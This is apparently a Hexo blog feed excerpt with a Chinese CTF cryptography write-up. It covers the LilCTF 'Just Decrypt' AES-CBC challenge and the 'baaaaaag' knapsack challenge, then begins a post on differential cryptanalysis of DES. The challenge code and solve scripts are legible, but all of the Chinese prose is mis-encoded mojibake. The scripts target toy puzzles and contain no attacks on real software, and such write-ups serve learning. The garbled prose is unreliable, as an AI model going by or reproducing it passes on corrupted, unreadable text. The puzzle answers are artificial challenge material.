ç»´çš„å­ç©ºé—´ç”Ÿæˆçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å°† key æ˜ å°„åˆ°å…¶ä»¿å°„å­ç©ºé—´ä¸­ï¼Œè¿™æ ·çš„è¯ key çš„æœªçŸ¥ä½æ•°å°±èƒ½ä» 50Ã—16&#x3D;800 bits å˜ä¸º 50Ã—12&#x3D;600bits åˆšå¥½èƒ½å¤Ÿæ±‚è§£ï¼Œè¯´æ˜æˆ‘ä»¬çš„æ–¹å‘æ˜¯æ­£ç¡®çš„ã€‚<br>æƒ³è¦å°†å…¶æ˜ å°„åˆ°ä»¿å°„å­ç©ºé—´ï¼Œæˆ‘ä»¬è¦çŸ¥é“å˜æ¢è¿‡ç¨‹ä¸­çš„çº¿æ€§å­ç©ºé—´çš„ä¸€ç»„<strong>åŸºå‘é‡</strong>å’Œ<strong>åç§»é‡</strong>ï¼š</p><ul><li>$vï¼ˆåç§»é‡ï¼‰ï¼š$ ç”±äºåç§»é‡å°±æ˜¯çº¿æ€§å­ç©ºé—´å‘ä»¿å°„å­ç©ºé—´çš„åç§»ï¼Œä¸”çº¿æ€§å­ç©ºé—´ä¸­å­˜åœ¨é›¶å‘é‡ï¼Œå› æ­¤æˆ‘ä»¬åªè¦éšæ„å–ä»¿å°„å­ç©ºé—´ä¸­çš„ä¸€ä¸ªå‘é‡ä½œä¸ºåç§»é‡å³å¯ï¼Œé€šå¸¸ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä¼šå–ç¬¬ä¸€ä¸ªå‘é‡ä½œä¸ºåç§»é‡ï¼Œå³ <code>vecs[0]</code>ã€‚</li><li>$Lï¼ˆåŸºå‘é‡ï¼‰ï¼š$ æˆ‘ä»¬å¯ä»¥é€šè¿‡å¾—åˆ°ä¸€ç»„çº¿æ€§å­ç©ºé—´çš„å‘é‡ï¼ˆå¦‚æœ¬é¢˜çš„ 4096 ä¸ªå‘é‡ï¼‰ï¼Œç„¶åé€šè¿‡<strong>GFï¼ˆ2ï¼‰ä¸‹é«˜æ–¯æ¶ˆå…ƒ</strong>å³å¯å¾—åˆ°ä¸€ç»„åŸºå‘é‡ï¼ˆ12 ä¸ªï¼‰ã€‚<br>åœ¨å¾—åˆ°è¿™äº›å€¼ä¹‹åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å°† key æ˜ å°„åˆ° ä»¿å°„å­ç©ºé—´ä¸Šï¼š<br>$$<br>key_{1 \times 16} &#x3D; x_{1 \times 12}  L_{12\times 16} + v_{1 \times 16}<br>$$<br>æ³¨æ„ï¼Œæˆ‘è¿™é‡Œåªæ˜¯å•ç‹¬åˆ—ä¸¾äº†å…¶ä¸­ä¸€ä¸ªç»„ï¼Œå…±æœ‰ 50 ç»„ï¼Œæ¯ä¸ª key éƒ½è¦è¿›è¡Œè¿™æ ·çš„å˜æ¢ã€‚<br><strong>ä»£ç ï¼š</strong><br>ohhï¼Œç”±äºæˆ‘æ¯”è¾ƒæ‡’ï¼Œai å†™çš„ä»£ç ä¹Ÿæ¯”è¾ƒä¹±ï¼Œå¤ªéš¾çœ‹äº†ï¼ˆä¸æƒ³æ‹¿å‡ºæ¥ä¸¢äººäº†ï¼Œå¦‚æœæœ‰éœ€è¦è¯·ç›´æ¥çœ‹é¸¡å—å¸ˆå‚…çš„å®˜æ–¹expï¼ˆ<a href="https://tangcuxiaojikuai.xyz/post/e7cc42f8.html">2025-8-wp-crypto | ç³–é†‹å°é¸¡å—çš„blog</a>ï¼‰ï¼Œéå¸¸çš„ç®€æ´æ˜äº†</li></ul><h2 id="WARM-UP-å¯¹ç§°ï¼Just-Decrypt"><a href="#WARM-UP-å¯¹ç§°ï¼Just-Decrypt" class="headerlink" title="[WARM UP] å¯¹ç§°ï¼Just Decrypt"></a>[WARM UP] å¯¹ç§°ï¼Just Decrypt</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;Just Decrypt - A simple LilCTF warmup challenge.&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br><br>FLAG = <span class="hljs-string">b&quot;&quot;</span><br>key = Random(<span class="hljs-number">2025</span>).randbytes(<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(key)<br><br><span class="hljs-built_in">print</span>(AES.new(key, AES.MODE_CBC, iv=FLAG[<span class="hljs-number">9</span>:<span class="hljs-number">25</span>]).encrypt(pad(FLAG, <span class="hljs-number">16</span>)).<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-comment">#ae39cfab1ba8d38fc3761216c393caf16e3c3f13fe57e2dedd52f1b13072fa93df405c7e731a193cabe5fd88ee3241f79aded62d139faba8c767a3b8efc5a855</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>ç¡®å®æ˜¯ç­¾åˆ°é¢˜ï¼Œä¹Ÿæ˜¯éå¸¸çš„ easyï¼Œæˆ‘ä»¬é¦–å…ˆèƒ½å¤Ÿæ˜æ˜¾çœ‹å‡ºæ¥ key çš„å€¼æ˜¯å›ºå®šçš„ï¼ˆå› ä¸ºç”¨æ¥ç”Ÿæˆçš„éšæœºæ•°ç§å­å›ºå®š<br>ç„¶åæˆ‘ä»¬å‘ç° iv çš„å€¼ä¹Ÿéå¸¸çš„å¯ç–‘ï¼Œå› ä¸ºä»–æ˜¯ FLAG çš„ 10~25 å­—èŠ‚çš„å€¼ï¼Œè€Œæˆ‘ä»¬æŒ‡å¯¼ FLAG çš„å¼€å¤´æ˜¯ LILCTF{ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å·²ç»çŸ¥é“äº†å‰ 7 ä¸ªå­—èŠ‚ï¼Œè€Œæˆ‘ä»¬ç»“åˆ CBC åŠ å¯†æ¨¡å¼ï¼Œèƒ½å¤Ÿå¾—åˆ° FLAG å‰ 16 ä¸ªå­—èŠ‚å’Œ iv çš„å¼‚æˆ–å€¼ï¼Œå› æ­¤é¦–å…ˆæˆ‘ä»¬èƒ½å¤Ÿç›´æ¥å¾—åˆ° iv çš„å‰ 7 ä¸ªå­—èŠ‚çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ FLAG ä¸­10~16 å­—èŠ‚çš„å€¼ï¼Œè™½ç„¶ 8ï¼Œ9 ä½ç½®çš„ FLAG å­—ç¬¦è¿˜æœªçŸ¥ï¼Œä½†ä»…æœ‰ä¸¤ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›è¡Œçˆ†ç ´ï¼Œä¾¿èƒ½å¾—åˆ°å®Œæ•´çš„ iv ï¼Œä¹‹åå°±èƒ½ç›´æ¥å¯¹ AES è¿›è¡Œ CBC æ¨¡å¼çš„è§£å¯†äº†ã€‚<br><strong>è„šæœ¬ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>key = Random(<span class="hljs-number">2025</span>).randbytes(<span class="hljs-number">16</span>)<br>cipher = <span class="hljs-string">&quot;ae39cfab1ba8d38fc3761216c393caf16e3c3f13fe57e2dedd52f1b13072fa93df405c7e731a193cabe5fd88ee3241f79aded62d139faba8c767a3b8efc5a855&quot;</span><br>cipher_bytes = <span class="hljs-built_in">bytes</span>.fromhex(cipher)<br><br>cipher1 = cipher_bytes[:<span class="hljs-number">16</span>]<br>encoder = AES.new(key, AES.MODE_ECB)<br><br>table = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>    table.append(<span class="hljs-built_in">chr</span>(i).encode())<br><span class="hljs-built_in">print</span>(table)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>        plain_pre = <span class="hljs-string">b&quot;LILCTF&#123;&quot;</span> + i + j<br>        iv1 = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(encoder.decrypt(cipher1), plain_pre + <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">7</span>))<br>        iv = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(encoder.decrypt(cipher1), plain_pre + iv1[:<span class="hljs-number">7</span>]))<br>        <span class="hljs-comment">#print(iv)</span><br>        plaintext = AES.new(key, AES.MODE_CBC, iv=iv).decrypt(cipher_bytes)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(k <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>)) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> iv) <span class="hljs-keyword">and</span> iv == plaintext[<span class="hljs-number">9</span>:<span class="hljs-number">25</span>]:<br>            <span class="hljs-built_in">print</span>(iv)<br>            <span class="hljs-built_in">print</span>(plaintext)<br></code></pre></td></tr></table></figure><h2 id="baaaaaag"><a href="#baaaaaag" class="headerlink" title="baaaaaag"></a>baaaaaag</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = random.getrandbits(<span class="hljs-number">72</span>)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:]) == <span class="hljs-number">72</span><br><br>a = [getPrime(<span class="hljs-number">90</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">72</span>)]<br>b = <span class="hljs-number">0</span><br>t = p<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    temp = t % <span class="hljs-number">2</span><br>    b += temp * i<br>    t = t &gt;&gt; <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(p)<br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;a = <span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;b = <span class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext = <span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">a = [965032030645819473226880279, 699680391768891665598556373, 1022177754214744901247677527, 680767714574395595448529297, 1051144590442830830160656147, 1168660688736302219798380151, 796387349856554292443995049, 740579849809188939723024937, 940772121362440582976978071, 787438752754751885229607747, 1057710371763143522769262019, 792170184324681833710987771, 912844392679297386754386581, 906787506373115208506221831, 1073356067972226734803331711, 1230248891920689478236428803, 713426848479513005774497331, 979527247256538239116435051, 979496765566798546828265437, 836939515442243300252499479, 1185281999050646451167583269, 673490198827213717568519179, 776378201435505605316348517, 809920773352200236442451667, 1032450692535471534282750757, 1116346000400545215913754039, 1147788846283552769049123803, 994439464049503065517009393, 825645323767262265006257537, 1076742721724413264636318241, 731782018659142904179016783, 656162889354758353371699131, 1045520414263498704019552571, 1213714972395170583781976983, 949950729999198576080781001, 1150032993579134750099465519, 975992662970919388672800773, 1129148699796142943831843099, 898871798141537568624106939, 997718314505250470787513281, 631543452089232890507925619, 831335899173370929279633943, 1186748765521175593031174791, 884252194903912680865071301, 1016020417916761281986717467, 896205582917201847609656147, 959440423632738884107086307, 993368100536690520995612807, 702602277993849887546504851, 1102807438605649402749034481, 629539427333081638691538089, 887663258680338594196147387, 1001965883259152684661493409, 1043811683483962480162133633, 938713759383186904819771339, 1023699641268310599371568653, 784025822858960757703945309, 986182634512707587971047731, 1064739425741411525721437119, 1209428051066908071290286953, 667510673843333963641751177, 642828919542760339851273551, 1086628537309368288204342599, 1084848944960506663668298859, 667827295200373631038775959, 752634137348312783761723507, 707994297795744761368888949, 747998982630688589828284363, 710184791175333909291593189, 651183930154725716807946709, 724836607223400074343868079, 1118993538091590299721647899]</span><br><span class="hljs-string">b = 34962396275078207988771864327</span><br><span class="hljs-string">ciphertext = b&#x27;Lo~G\xf46&gt;\xd609\x8e\x8e\xf5\xf83\xb5\xf0\x8f\x9f6&amp;\xea\x02\xfa\xb1_L\x85\x93\x93\xf7,`|\xc6\xbe\x05&amp;\x85\x8bC\xcd\xe6?TV4q&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>çœ‹å®Œé¢˜ç›®ï¼Œå¯ä»¥å‘ç°æ˜¯éå¸¸åŸå§‹çš„èƒŒåŒ…åŠ å¯†ç³»ç»Ÿï¼Œç›´æ¥é€ æ ¼æ‰“ LLL ä¼šå‘ç°å‡ºä¸äº†ç»“æœï¼Œä½†æ˜¯ä½¿ç”¨ BKZï¼Œç„¶å block_size è®¾ç½®çš„ç¨å¾®å¤§ä¸€ç‚¹å°±èƒ½å‡ºã€‚<br><strong>è„šæœ¬ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><br>a = [<span class="hljs-number">965032030645819473226880279</span>, <span class="hljs-number">699680391768891665598556373</span>, <span class="hljs-number">1022177754214744901247677527</span>, <span class="hljs-number">680767714574395595448529297</span>, <span class="hljs-number">1051144590442830830160656147</span>, <span class="hljs-number">1168660688736302219798380151</span>, <span class="hljs-number">796387349856554292443995049</span>, <span class="hljs-number">740579849809188939723024937</span>, <span class="hljs-number">940772121362440582976978071</span>, <span class="hljs-number">787438752754751885229607747</span>, <span class="hljs-number">1057710371763143522769262019</span>, <span class="hljs-number">792170184324681833710987771</span>, <span class="hljs-number">912844392679297386754386581</span>, <span class="hljs-number">906787506373115208506221831</span>, <span class="hljs-number">1073356067972226734803331711</span>, <span class="hljs-number">1230248891920689478236428803</span>, <span class="hljs-number">713426848479513005774497331</span>, <span class="hljs-number">979527247256538239116435051</span>, <span class="hljs-number">979496765566798546828265437</span>, <span class="hljs-number">836939515442243300252499479</span>, <span class="hljs-number">1185281999050646451167583269</span>, <span class="hljs-number">673490198827213717568519179</span>, <span class="hljs-number">776378201435505605316348517</span>, <span class="hljs-number">809920773352200236442451667</span>, <span class="hljs-number">1032450692535471534282750757</span>, <span class="hljs-number">1116346000400545215913754039</span>, <span class="hljs-number">1147788846283552769049123803</span>, <span class="hljs-number">994439464049503065517009393</span>, <span class="hljs-number">825645323767262265006257537</span>, <span class="hljs-number">1076742721724413264636318241</span>, <span class="hljs-number">731782018659142904179016783</span>, <span class="hljs-number">656162889354758353371699131</span>, <span class="hljs-number">1045520414263498704019552571</span>, <span class="hljs-number">1213714972395170583781976983</span>, <span class="hljs-number">949950729999198576080781001</span>, <span class="hljs-number">1150032993579134750099465519</span>, <span class="hljs-number">975992662970919388672800773</span>, <span class="hljs-number">1129148699796142943831843099</span>, <span class="hljs-number">898871798141537568624106939</span>, <span class="hljs-number">997718314505250470787513281</span>, <span class="hljs-number">631543452089232890507925619</span>, <span class="hljs-number">831335899173370929279633943</span>, <span class="hljs-number">1186748765521175593031174791</span>, <span class="hljs-number">884252194903912680865071301</span>, <span class="hljs-number">1016020417916761281986717467</span>, <span class="hljs-number">896205582917201847609656147</span>, <span class="hljs-number">959440423632738884107086307</span>, <span class="hljs-number">993368100536690520995612807</span>, <span class="hljs-number">702602277993849887546504851</span>, <span class="hljs-number">1102807438605649402749034481</span>, <span class="hljs-number">629539427333081638691538089</span>, <span class="hljs-number">887663258680338594196147387</span>, <span class="hljs-number">1001965883259152684661493409</span>, <span class="hljs-number">1043811683483962480162133633</span>, <span class="hljs-number">938713759383186904819771339</span>, <span class="hljs-number">1023699641268310599371568653</span>, <span class="hljs-number">784025822858960757703945309</span>, <span class="hljs-number">986182634512707587971047731</span>, <span class="hljs-number">1064739425741411525721437119</span>, <span class="hljs-number">1209428051066908071290286953</span>, <span class="hljs-number">667510673843333963641751177</span>, <span class="hljs-number">642828919542760339851273551</span>, <span class="hljs-number">1086628537309368288204342599</span>, <span class="hljs-number">1084848944960506663668298859</span>, <span class="hljs-number">667827295200373631038775959</span>, <span class="hljs-number">752634137348312783761723507</span>, <span class="hljs-number">707994297795744761368888949</span>, <span class="hljs-number">747998982630688589828284363</span>, <span class="hljs-number">710184791175333909291593189</span>, <span class="hljs-number">651183930154725716807946709</span>, <span class="hljs-number">724836607223400074343868079</span>, <span class="hljs-number">1118993538091590299721647899</span>]<br>b = <span class="hljs-number">34962396275078207988771864327</span><br>ciphertext = <span class="hljs-string">b&#x27;Lo~G\xf46&gt;\xd609\x8e\x8e\xf5\xf83\xb5\xf0\x8f\x9f6&amp;\xea\x02\xfa\xb1_L\x85\x93\x93\xf7,`|\xc6\xbe\x05&amp;\x85\x8bC\xcd\xe6?TV4q&#x27;</span><br><br>n = <span class="hljs-built_in">len</span>(a)<br>d = n / log(<span class="hljs-built_in">max</span>(a),<span class="hljs-number">2</span>) <span class="hljs-comment">#&lt;0.9408</span><br><span class="hljs-built_in">print</span>(RealField(<span class="hljs-number">20</span>)(d))<br>M = matrix(ZZ,n+<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    M[i, i] = <span class="hljs-number">2</span><br>    M[i,-<span class="hljs-number">1</span>] = a[i]<br>    M[-<span class="hljs-number">1</span>,i] = <span class="hljs-number">1</span><br>M[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>] = b<br><span class="hljs-comment">#print(M)</span><br>M_det = det(M)<br>B = sqrt(n+<span class="hljs-number">1</span>)*M_det<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;B=&quot;</span>,RealField(<span class="hljs-number">20</span>)(B))<br><br>L = M.BKZ(block_size = <span class="hljs-number">26</span>)<br><span class="hljs-comment">#L = M.LLL()</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> L:<br>    p = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> i[-<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            <span class="hljs-keyword">if</span> i[j] &gt; <span class="hljs-number">0</span>:<br>                p = <span class="hljs-string">&quot;1&quot;</span> + p<br>            <span class="hljs-keyword">else</span>:<br>                p = <span class="hljs-string">&quot;0&quot;</span> + p<br>        <span class="hljs-comment">#print(p)</span><br>        p = <span class="hljs-built_in">int</span>(p,<span class="hljs-number">2</span>)<br>        <span class="hljs-comment">#print(i)     </span><br>        key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>        cipher = AES.new(key, AES.MODE_ECB)<br>        flag = cipher.decrypt(ciphertext)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;CTF&quot;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p>è‡³æ­¤ï¼Œå¤ç°å·²å®Œï¼Œè™½ç„¶æ•´ä½“éš¾åº¦ä¸å¤§ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è®¸å¤šæ”¶è·çš„ï¼Œæ¯”å¦‚ç›¸ä¼¼çŸ©é˜µç‰¹å¾å€¼ç›¸ç­‰ã€ä»¿å°„å­ç©ºé—´ç­‰é¢˜ç›®ä¹‹å‰å¹¶æ²¡æœ‰æ€ä¹ˆæ¥è§¦è¿‡ï¼Œè¡¥ä¸€è¡¥çº¿æ€§ä»£æ•°çŸ¥è¯†ä¹Ÿæ˜¯å¥½äº‹ï¼Œä¸è‡³äºæˆä¸ºå½»å¤´å½»åº•çš„è„šæœ¬å°å­ï¼ˆè™½ç„¶æ‰“æ¿å­ä¹Ÿé‡è¦<br>ä¹Ÿæ·±åˆ»è®¤è¯†åˆ°äº†å¦‚ä»Š ai å¯¹å¯†ç é€ æˆäº†éå¸¸å¤§çš„å½±å“ï¼Œè®¸å¤šé¢˜ç›®éƒ½èƒ½è¢« ai ä¸€æŠŠæ¢­ï¼Œçœ‹åˆ°è®¸å¤šå…¶ä»–æ–¹å‘é€‰æ‰‹ä¹Ÿèƒ½ä½¿ç”¨ ai æ¥ ak å¯†ç é¢˜ç›®ï¼Œè®¤çœŸåˆ†æå†™è„šæœ¬çš„çº¯ç²¹å¯†ç æ‰‹ä¹Ÿè¶Šæ¥è¶Šå°‘ï¼ˆè™½ç„¶æˆ‘æœ‰æ—¶ä¹Ÿå·æ‡’ï¼Œä½†æˆ‘å¹¶ä¸è®¤å¯è¿™ç§è¡Œä¸ºã€‚ã€‚ã€‚<br>å¾€åï¼Œå¯†ç æ‰‹å°†ä½•å»ä½•ä»å•Š</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CryptoåŸºç¡€ç¯‡-å·®åˆ†å¯†ç åˆ†æ</title>
    <link href="/2025/08/15/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2025/08/15/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬ç¯‡åšå®¢ç”¨äºè®°å½•æœ¬äººå¯¹äºå·®åˆ†å¯†ç åˆ†æçš„å…¥é—¨å­¦ä¹ ï¼Œä¸»è¦å‚è€ƒä¸ºç½‘ä¸Šå„ç§åšå®¢ä»¥åŠã€Šåˆ†ç»„å¯†ç çš„æ”»å‡»æ–¹æ³•ä¸å®ä¾‹åˆ†æ (æè¶…, å­™å…µ, æç‘æ—) ã€‹ã€‚åŒæ—¶ç”±äºCTFä¸­å‡ºé¢˜çš„å¸¸è§æ€§ï¼Œæœ¬æ–‡ä¸»è¦ä¾§é‡äºå¯¹DESçš„å·®åˆ†åˆ†æã€‚</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p><strong>å·®åˆ†å¯†ç åˆ†æ</strong>æ˜¯æ”»å‡»<strong>è¿­ä»£å‹åˆ†ç»„å¯†ç </strong>æœ€æœ‰æ•ˆçš„æ–¹æ³•ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯è¡¡é‡ä¸€ä¸ªåˆ†ç»„å¯†ç å®‰å…¨æ€§çš„é‡è¦æŒ‡æ ‡ä¹‹ä¸€ã€‚å®ƒå±äº<strong>é€‰æ‹©æ˜æ–‡æ”»å‡»</strong></p><h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><p>åœ¨æ·±å…¥æ¢ç©¶å·®åˆ†åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬è¦ç†è§£ä¸€äº›æ¦‚å¿µï¼ˆè¿™é‡Œæˆ‘åªæ˜¯ç”¨è‡ªå·±çš„è¯æè¿°ä¸€ä¸‹ï¼Œå¹¶ä¸è¶³å¤Ÿä¸¥è°¨ï¼‰ï¼š<br><strong>å·®åˆ†å€¼ï¼š</strong> ä¸¤ä¸ªæ•°$X,Xâ€™$çš„å·®åˆ†å€¼ä¸º$\Delta X &#x3D; X \oplus Xâ€™$<br><strong>å·®åˆ†å¯¹ï¼š</strong> åœ¨åˆ†ç»„å¯†ç ä¸­ï¼Œè®¾è¾“å…¥å¯¹$(X,Xâ€™)$çš„å·®åˆ†å€¼ä¸º$\alpha$ï¼Œç»è¿‡$i$è½®åŠ å¯†åå¾—åˆ°çš„è¾“å‡ºå¯¹$(Y_i,Y_iâ€™)$çš„å·®åˆ†å€¼ä¸º$\beta$ï¼Œåˆ™ç§°$(\alpha,\beta)$ä¸ºè¯¥åˆ†ç»„å¯†ç çš„ä¸€ä¸ª$i$è½®å·®åˆ†å¯¹<br><strong>å·®åˆ†ç‰¹å¾ï¼ˆå·®åˆ†è·¯å¾„ï¼‰ï¼š</strong> å¯¹äºä¸€ä¸ª$n$è½®åˆ†ç»„å¯†ç çš„å·®åˆ†ç‰¹å¾$\Omega&#x3D;(\beta_0,\beta_1,,,\beta_{n-1},\beta_n)$ï¼Œè¡¨ç¤ºè¾“å…¥å¯¹$(X,Xâ€™)$çš„å·®åˆ†å€¼ä¸º$\beta_0$ï¼ŒåŠ å¯†$i$è½®åå¾—åˆ°çš„ä¸­é—´å¯¹$(Y_i,Y_iâ€™)$çš„å·®åˆ†å€¼ä¸º$\beta_i$</p><h1 id="DESçš„å·®åˆ†å¯†ç åˆ†æ"><a href="#DESçš„å·®åˆ†å¯†ç åˆ†æ" class="headerlink" title="DESçš„å·®åˆ†å¯†ç åˆ†æ"></a>DESçš„å·®åˆ†å¯†ç åˆ†æ</h1><p>åœ¨DESä¸­ï¼Œå…¶åˆå§‹ç½®æ¢$IP$å’Œé€†ç½®æ¢$IP^{-1}$å…¬å¼€ï¼Œå› 